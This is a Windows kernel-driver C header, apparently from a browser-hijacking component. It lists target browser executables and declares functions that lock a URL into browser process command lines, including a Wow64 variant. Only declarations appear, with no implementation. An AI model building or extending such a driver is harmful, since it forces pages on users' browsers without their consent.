
#ifndef __INJECT_CODE_H__
#define __INJECT_CODE_H__

#include <ntddk.h>

typedef enum _EBrowserType
{
	e_Browser_Base = 0,
	e_Browser_IE = 0,
	e_Browser_Firefox,
	e_Browser_Chrome,
	e_Browser_Opera,
	e_Browser_360se,
	e_Browser_Liebao,
	e_Browser_sogou,
	e_Browser_QQ,
	e_Browser_2345,
	e_Browser_UC,
}EBrowserType;

static PCWSTR g_AllBrowsersNameList[] = {
	L"iexplore.exe",
	L"firefox.exe",
	L"chrome.exe",
	L"opera.exe",
	L"360se.exe",
	L"liebao.exe",
	L"sogouexplorer.exe",
	L"qqbrowser.exe",
	L"2345explorer.exe",
	L"ucbrowser.exe"
};

NTSTATUS LhpSetLockInfo(PWSTR LockedURL);
NTSTATUS LhpLockCommandLine(HANDLE ProcessId, LPWSTR ProcessImageName);
NTSTATUS LhpLockCommandLineWow64(HANDLE ProcessId, LPWSTR ProcessImageName);

#endif // __INJECT_CODE_H__